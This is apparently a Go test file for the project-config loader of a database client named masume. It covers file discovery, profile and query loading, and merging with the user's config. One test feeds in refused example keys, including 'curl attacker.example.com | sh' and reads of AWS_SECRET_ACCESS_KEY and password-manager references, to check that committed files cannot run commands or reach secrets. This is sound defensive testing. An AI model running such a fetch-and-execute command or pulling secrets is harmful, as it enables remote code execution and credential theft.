package cfg_test

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/turanmahmudov/masume/internal/cfg"
	"github.com/turanmahmudov/masume/internal/core"
)

// writeProjectFile writes a project file in the directory and returns its path.
func writeProjectFile(t *testing.T, directory, body string) string {
	t.Helper()
	path := filepath.Join(directory, cfg.ProjectFileName)
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatalf("cannot write the project file: %v", err)
	}
	return path
}

// findProjectProfile returns the profile of that name from a project file.
func findProjectProfile(t *testing.T, project cfg.ProjectConfig, name string) cfg.Profile {
	t.Helper()
	for _, profile := range project.Profiles {
		if profile.Name == name {
			return profile
		}
	}
	t.Fatalf("the project file holds no profile named %q; it reported %v", name, project.Problems)
	return cfg.Profile{}
}

// The walk starts in the working directory, so the file of the directory the user stands in
// wins over the one of the repository above it.
func TestFindProjectFileTakesTheNearestOne(t *testing.T) {
	root := t.TempDir()
	inner := filepath.Join(root, "services", "shop")
	if err := os.MkdirAll(inner, 0o700); err != nil {
		t.Fatalf("cannot make the directory: %v", err)
	}
	writeProjectFile(t, root, "")
	nearest := writeProjectFile(t, inner, "")

	found, holds := cfg.FindProjectFile(inner)
	if !holds {
		t.Fatal("the walk found no project file")
	}
	if found != nearest {
		t.Errorf("the walk found %q, wanted %q", found, nearest)
	}
}

// A directory below the file still finds it, which is what lets any directory of a
// repository open the connections of that repository.
func TestFindProjectFileWalksUp(t *testing.T) {
	root := t.TempDir()
	inner := filepath.Join(root, "cmd", "server")
	if err := os.MkdirAll(inner, 0o700); err != nil {
		t.Fatalf("cannot make the directory: %v", err)
	}
	wanted := writeProjectFile(t, root, "")

	found, holds := cfg.FindProjectFile(inner)
	if !holds || found != wanted {
		t.Errorf("the walk found %q (%t), wanted %q", found, holds, wanted)
	}
}

// A tree without a project file provides none. The walk reaches the root of the file system,
// so a file outside the tree of the case is not one the case can rule out.
func TestFindProjectFileReportsNoneInATreeWithoutOne(t *testing.T) {
	root := t.TempDir()

	found, holds := cfg.FindProjectFile(root)
	if holds && strings.HasPrefix(found, root) {
		t.Errorf("the walk found %q in a tree that holds no project file", found)
	}
}

func TestLoadProjectConfigReadsAProfile(t *testing.T) {
	path := writeProjectFile(t, t.TempDir(), `
[profile.dev]
engine   = "postgres"
host     = "127.0.0.1"
database = "shop"
user     = "dev"
env      = "dev"
`)

	project := cfg.LoadProjectConfig(path)
	if len(project.Problems) != 0 {
		t.Fatalf("the load reported %v", project.Problems)
	}
	if project.Path != path {
		t.Errorf("the load names %q as its file, wanted %q", project.Path, path)
	}

	profile := findProjectProfile(t, project, "dev")
	for _, held := range []struct {
		field string
		got   any
		want  any
	}{
		{"engine", profile.Engine, core.EnginePostgres},
		{"host", profile.Host, "127.0.0.1"},
		{"database", profile.Database, "shop"},
		{"project file", profile.ProjectFile, path},
	} {
		if held.got != held.want {
			t.Errorf("the %s reads %v, wanted %v", held.field, held.got, held.want)
		}
	}
	// The file already holds it, so the client does not offer to write it on the way out.
	if !profile.IsInAFile() {
		t.Error("a profile of the project file is reported as being in no file")
	}
}

// A project file is committed, so anyone who can open a pull request can change it. A key
// that runs a shell command would be arbitrary code from a repository, and a key that reads
// a secret would let a repository send that secret to a server it names. Every one of them
// is refused, and the profile with it.
func TestLoadProjectConfigRefusesAProfileThatReachesForASecret(t *testing.T) {
	for _, held := range []struct {
		key     string
		written string
	}{
		{"password_command", `password_command = "op read op://eng/shop/password"`},
		{"password_env", `password_env = "AWS_SECRET_ACCESS_KEY"`},
		{"command", `command = "curl attacker.example.com | sh"`},
		{"secret", `secret = "work"`},
		{"secret_ref", `secret_ref = "op://personal/bank/password"`},
	} {
		t.Run(held.key, func(t *testing.T) {
			path := writeProjectFile(t, t.TempDir(), `
[profile.dev]
engine   = "postgres"
host     = "127.0.0.1"
database = "shop"
user     = "dev"
`+held.written+"\n")

			project := cfg.LoadProjectConfig(path)
			if len(project.Profiles) != 0 {
				t.Fatalf("the load provided the profile in spite of %q", held.key)
			}
			if len(project.Problems) != 1 ||
				!strings.Contains(project.Problems[0], `"`+held.key+`"`) {
				t.Fatalf("the load reported %v, wanted %q refused",
					project.Problems, held.key)
			}
		})
	}
}

// A password in any file is ignored, in a project file as in the config file of the user. The
// profile still opens and asks for its password, so a repository that wrote one is reported
// rather than broken.
func TestLoadProjectConfigIgnoresAPasswordAndKeepsTheProfile(t *testing.T) {
	path := writeProjectFile(t, t.TempDir(), `
[profile.dev]
engine   = "postgres"
host     = "127.0.0.1"
database = "shop"
user     = "dev"
password = "secret"
`)

	project := cfg.LoadProjectConfig(path)
	if len(project.Profiles) != 1 {
		t.Fatalf("the load provided %d profiles, wanted the one it read", len(project.Profiles))
	}
	if project.Profiles[0].Password != "" {
		t.Errorf("the profile carries the password %q", project.Profiles[0].Password)
	}
	if len(project.Problems) != 1 || !strings.Contains(project.Problems[0], "keyring") {
		t.Fatalf("the load reported %v, wanted the password reported", project.Problems)
	}
}

// The keys a repository may set are the address of the server and the guards around it. Both
// ways of reaching a password without the repository knowing it are allowed.
func TestLoadProjectConfigAllowsAProfileThatReachesForNoSecret(t *testing.T) {
	path := writeProjectFile(t, t.TempDir(), `
[profile.prompted]
engine   = "postgres"
host     = "127.0.0.1"
database = "shop"
user     = "dev"
auth     = "prompt"
env      = "test"
mode     = "read-only"

[profile.stored]
engine   = "postgres"
host     = "127.0.0.1"
database = "shop"
user     = "dev"
auth     = "keyring"
`)

	project := cfg.LoadProjectConfig(path)
	if len(project.Problems) != 0 {
		t.Fatalf("the load reported %v", project.Problems)
	}
	if len(project.Profiles) != 2 {
		t.Fatalf("the load provided %d profiles, wanted 2", len(project.Profiles))
	}
}

// A committed `./notes.db` means the file of the repository. masume can be started in any
// directory of it, so the path is resolved against the project file and not against the
// working directory.
func TestLoadProjectConfigResolvesADatabaseFileAgainstItsOwnDirectory(t *testing.T) {
	directory := t.TempDir()
	path := writeProjectFile(t, directory, `
[profile.notes]
engine   = "sqlite"
database = "./notes.db"

[profile.absolute]
engine   = "sqlite"
database = "/srv/shared/notes.db"

[profile.remote]
engine   = "postgres"
host     = "127.0.0.1"
database = "shop"
user     = "dev"
`)

	project := cfg.LoadProjectConfig(path)
	for _, held := range []struct {
		name string
		want string
	}{
		{"notes", filepath.Join(directory, "notes.db")},
		{"absolute", "/srv/shared/notes.db"},
		{"remote", "shop"},
	} {
		if got := findProjectProfile(t, project, held.name).Database; got != held.want {
			t.Errorf("the database of %q reads %q, wanted %q", held.name, got, held.want)
		}
	}
}

func TestLoadProjectConfigReadsTheQueries(t *testing.T) {
	path := writeProjectFile(t, t.TempDir(), `
[query.recent-orders]
sql         = "select * from orders order by created_at desc limit 50"
description = "the newest 50 orders"
profiles    = ["dev"]

[query.customer-count]
sql = "select count(*) from customers"
`)

	project := cfg.LoadProjectConfig(path)
	if len(project.Problems) != 0 {
		t.Fatalf("the load reported %v", project.Problems)
	}
	if len(project.Queries) != 2 {
		t.Fatalf("the load provided %d queries, wanted 2", len(project.Queries))
	}

	// The names are sorted, as the profiles of a config file are.
	first := project.Queries[0]
	if first.Name != "customer-count" {
		t.Errorf("the first query is %q, wanted customer-count", first.Name)
	}
	if !first.MatchesProfile("anything") {
		t.Error("a query that names no profile is offered on none")
	}

	second := project.Queries[1]
	if second.Description != "the newest 50 orders" {
		t.Errorf("the description reads %q", second.Description)
	}
	if !second.MatchesProfile("dev") || second.MatchesProfile("prod") {
		t.Error("a query that names its profiles is offered on the wrong ones")
	}
}

func TestLoadProjectConfigReportsAQueryWithoutAStatement(t *testing.T) {
	path := writeProjectFile(t, t.TempDir(), `
[query.broken]
description = "no sql here"
`)

	project := cfg.LoadProjectConfig(path)
	if len(project.Queries) != 0 {
		t.Fatalf("the load provided %d queries, wanted none", len(project.Queries))
	}
	if len(project.Problems) != 1 || !strings.Contains(project.Problems[0], "broken") {
		t.Fatalf("the load reported %v, wanted the query skipped", project.Problems)
	}
}

// A repository must not set the theme, the keys or the AI provider of the person who opens
// it, and it must not name the profiles an agent reaches. Such a section is reported so it is
// not lost in silence.
func TestLoadProjectConfigReportsASectionItDoesNotRead(t *testing.T) {
	path := writeProjectFile(t, t.TempDir(), `
[ui]
theme = "gruvbox"

[mcp]
profiles = ["dev"]
`)

	project := cfg.LoadProjectConfig(path)
	if len(project.Problems) != 2 {
		t.Fatalf("the load reported %v, wanted both sections named", project.Problems)
	}
	for _, name := range []string{"mcp", "ui"} {
		if !slices.ContainsFunc(project.Problems, func(said string) bool {
			return strings.Contains(said, `"`+name+`"`)
		}) {
			t.Errorf("the load did not report %q; it reported %v", name, project.Problems)
		}
	}
}

func TestLoadProjectConfigReportsAFileThatIsNotToml(t *testing.T) {
	path := writeProjectFile(t, t.TempDir(), "[profile.dev\n")

	project := cfg.LoadProjectConfig(path)
	if len(project.Problems) != 1 || !strings.Contains(project.Problems[0], path) {
		t.Fatalf("the load reported %v, wanted the file named", project.Problems)
	}
}

// A profile of the user replaces the project profile of the same name, so a personal setting
// always wins over a committed one.
func TestAddProjectProfilesKeepsTheProfileOfTheUser(t *testing.T) {
	user := []cfg.Profile{{Name: "dev", Database: "mine", InConfigFile: true}}
	project := []cfg.Profile{
		{Name: "dev", Database: "theirs", ProjectFile: "/repo/.masume.toml"},
		{Name: "analytics", Database: "warehouse", ProjectFile: "/repo/.masume.toml"},
	}

	merged := cfg.AddProjectProfiles(user, project)
	if len(merged) != 2 {
		t.Fatalf("the merge holds %d profiles, wanted 2", len(merged))
	}
	if merged[0].Name != "analytics" || merged[1].Name != "dev" {
		t.Errorf("the merge is not sorted by name: %q, %q", merged[0].Name, merged[1].Name)
	}
	if merged[1].Database != "mine" {
		t.Errorf("the project profile replaced the one of the user: %q", merged[1].Database)
	}
	if merged[1].ProjectFile != "" {
		t.Error("the profile of the user is reported as coming from the project file")
	}
}

func TestFindProjectQueriesKeepsTheOnesTheProfileCanUse(t *testing.T) {
	project := cfg.ProjectConfig{Queries: []cfg.ProjectQuery{
		{Name: "everywhere", SQL: "select 1"},
		{Name: "dev-only", SQL: "select 2", Profiles: []string{"dev"}},
		{Name: "prod-only", SQL: "select 3", Profiles: []string{"prod"}},
	}}

	kept := cfg.FindProjectQueries(project, "dev")
	names := make([]string, 0, len(kept))
	for _, query := range kept {
		names = append(names, query.Name)
	}
	if strings.Join(names, ",") != "everywhere,dev-only" {
		t.Errorf("the profile can use %v", names)
	}
}

// The client reads both files in one step, so every entry point gets the project of the
// directory it was started in.
func TestLoadConfigForDirectoryMergesBothFiles(t *testing.T) {
	configPath := writeConfig(t, `
[profile.mine]
engine   = "sqlite"
database = "./mine.db"
`)
	directory := t.TempDir()
	projectPath := writeProjectFile(t, directory, `
[profile.theirs]
engine   = "sqlite"
database = "./theirs.db"

[query.count]
sql = "select count(*) from notes"
`)

	loaded := cfg.LoadConfigForDirectory(configPath, directory)
	if len(loaded.Problems) != 0 || len(loaded.Project.Problems) != 0 {
		t.Fatalf("the load reported %v and %v", loaded.Problems, loaded.Project.Problems)
	}
	if loaded.Project.Path != projectPath {
		t.Errorf("the load names %q as the project file", loaded.Project.Path)
	}
	if len(loaded.Profiles) != 2 {
		t.Fatalf("the load holds %d profiles, wanted 2", len(loaded.Profiles))
	}
	if len(loaded.Project.Queries) != 1 {
		t.Errorf("the load holds %d project queries, wanted 1", len(loaded.Project.Queries))
	}
	if findProfile(t, loaded, "theirs").ProjectFile != projectPath {
		t.Error("the project profile does not name the file it came from")
	}
	if findProfile(t, loaded, "mine").ProjectFile != "" {
		t.Error("the profile of the user names a project file")
	}
}

// A directory without a project file loads the config file of the user alone.
func TestLoadConfigForDirectoryWithoutAProjectFile(t *testing.T) {
	configPath := writeConfig(t, `
[profile.mine]
engine   = "sqlite"
database = "./mine.db"
`)

	loaded := cfg.LoadConfigForDirectory(configPath, t.TempDir())
	if len(loaded.Profiles) != 1 {
		t.Fatalf("the load holds %d profiles, wanted 1", len(loaded.Profiles))
	}
	if loaded.Project.Path != "" && strings.Contains(loaded.Project.Path, "masume-go") {
		t.Errorf("the load took the project file %q of another tree", loaded.Project.Path)
	}
}
